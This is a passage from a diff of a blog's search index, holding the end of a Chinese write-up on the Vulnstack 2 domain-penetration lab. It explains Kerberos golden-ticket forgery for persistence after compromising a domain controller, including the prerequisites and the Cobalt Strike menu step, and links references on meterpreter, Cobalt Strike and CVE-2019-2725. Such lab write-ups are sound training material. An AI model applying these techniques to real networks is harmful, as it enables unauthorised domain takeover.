+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心</span><br><span class="line">（KDC）证明用户已被其他域控制器认证。</span><br><span class="line"></span><br><span class="line">黄金票据的条件要求：</span><br><span class="line"><span class="number">1.</span>域名称</span><br><span class="line"><span class="number">2.</span>域的SID值</span><br><span class="line"><span class="number">3.</span>域的KRBTGT账户NTLM密码哈希</span><br><span class="line"><span class="number">4.</span>伪造用户名</span><br><span class="line"></span><br><span class="line">原理这篇 https:<span class="comment">//www.freesion.com/article/6833306427/ 博客讲的很详细。</span></span><br><span class="line"></span><br><span class="line">黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域</span><br><span class="line">控的 system 权限了，还可以使用黄金票据做权限维持，当域控权限掉后，在通过域内其他任意机器伪造票</span><br><span class="line">据重新获取最高权限。</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>WEB机 Administrator 权限机器-&gt;右键-&gt;Access-&gt;Golden Ticket</p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594217646994.png" alt="1594217646994"></p>
+<p><img src="/2020/07/14/Vulnstack%E4%BA%8C/1594217840245.png" alt="1594217840245"></p>
+<p>这个靶机主要使用的是cs来操作，靶机一则通过端口转发 、metasploit+proxychains代理等方式来进行横向移动，域渗透需要学的还有很多，后面会不断练习来完善相关技能</p>
+<p>参考文章：</p>
+<p><a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">后渗透之meterpreter使用攻略</a></p>
+<p><a href="https://www.cnblogs.com/wkzb/p/12431487.html" target="_blank" rel="noopener">cobaltstrike学习笔记</a></p>
+<p><a href="https://wh0ale.github.io/2019/12/11/VulnStack%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" target="_blank" rel="noopener">VulnStack域环境靶场渗透</a></p>
+<p><a href="http://www.shangdixinxi.com/detail-1457905.html" target="_blank" rel="noopener">ATT&amp;CK实战系列——红队实战（二）</a></p>
+<p><a href="https://www.freesion.com/article/6833306427/" target="_blank" rel="noopener">域渗透之（黄金票据利用）</a></p>
+<p><a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-2725" target="_blank" rel="noopener">CVE-2019-2725</a></p>
+<p><a href="https://klionsec.github.io/2017/09/23/cobalt-strike/" target="_blank" rel="noopener">cobalt strike 快速上手 [ 一 ]</a></p>
+]]></content>
+      <tags>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>vulnhub靶机-dpwwn-02</title>
     <url>/2020/07/06/dpwwn-02/</url>
     <content><![CDATA[<p><strong>vulnhub靶机-dpwwn-02</strong><br><strong>知识点：</strong></p>
